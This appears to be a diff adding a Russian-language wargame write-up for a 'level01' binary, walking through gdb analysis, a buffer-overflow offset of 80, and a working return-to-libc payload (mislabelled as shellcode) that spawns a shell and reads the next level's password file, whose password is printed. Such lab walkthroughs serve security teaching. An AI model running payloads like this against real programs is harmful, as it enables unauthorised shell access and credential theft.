@@ -1,0 +1,77 @@
+> gdb ./level01
+(gdb) disas main
+
+В отличие от level00 здесь нет вызова system("/bin/sh");
+Поэтому мы будем использовать shellcode.
+
+Эта программа запрашивает имя пользователя и пароль с помощью функции fgets().
+
+- 0x08048528 <+88>:	call   0x8048370 <fgets@plt>
+- 0x0804852d <+93>:	call   0x8048464 <verify_user_name>
+
+- 0x08048574 <+164>:	call   0x8048370 <fgets@plt>
+- 0x08048580 <+176>:	call   0x80484a3 <verify_user_pass>
+
+(gdb) disas verify_user_name
+Смотрим каждую переменную через команду:
+(gdb) x/s 0x8048690
+0x8048690:	 "verifying username....\n"
+(gdb) x/s 0x804a040
+0x804a040 <a_user_name>:	 "disas verify_user_name\n"
+(gdb) x/s 0x80486a8
+0x80486a8:	 "dat_wil"
+
+Видим, что последнее похоже на имя юзера "dat_wil"
+
+Используя шаблон переполнения буфера и gdb, мы можем легко найти смещение и сохранить EIP:
+https://wiremask.eu/tools/buffer-overflow-pattern-generator/ 
+
+Второй вариант использовать команду:
+(gdb) i reg $eip 
+Видим: eip            0x37634136	0x37634136
+Так мы получаем адрес конечной ячейки исполняемой программы
+
+Запускаем исполнение файла через gdb:
+(gdb) r
+Вводим имя "dat_wil"
+Вводим Pattern сгенерированнный на сайте wiremask.eu
+Получаем SIGSEGV, Segmentation fault
+Видим адрес ячейки, на которой остановились:
+0x37634136 in ?? ()
+Ввоодим этот адрес на wiremask.eu и получаем сдвиг на 80 ячеек
+До начала ввода имени юзера у нас адрес ячейки равен
+(gdb) x/s 0x804a040
+Делаем сдвиг на 7 ячеек для имени (dat_wil) и далее
+заполняем 
+
+Смотрим по какому адресу вызывается функция system
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+
+Далее смотрим по какому адресу находится  /bin/sh
+(gdb) find &system, +9999999, "/bin/sh"
+0xf7f897ec
+
+Пишем свой shellcode:
+(python -c 'print "dat_wil\n" + "#"*80 + "\xd0\xae\xe6\xf7" + "####" + "\xec\x97\xf8\xf7"' ; cat -) | ./level01
+
+Уточнение - в коде пишем реверс адреса 0xf7e6aed0 = "\xd0\xae\xe6\xf7"
+и адреса 0xf7f897ec = "\xec\x97\xf8\xf7"
+
+Выведется следующее сообщение:
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password:
+nope, incorrect password...
+
+Тут же вводим:
+> cd ../level02
+> cat .pass
+Получаем пароль!
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+Выходим (ctrl + С)
+
+> su level02
+вводим пароль: PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+
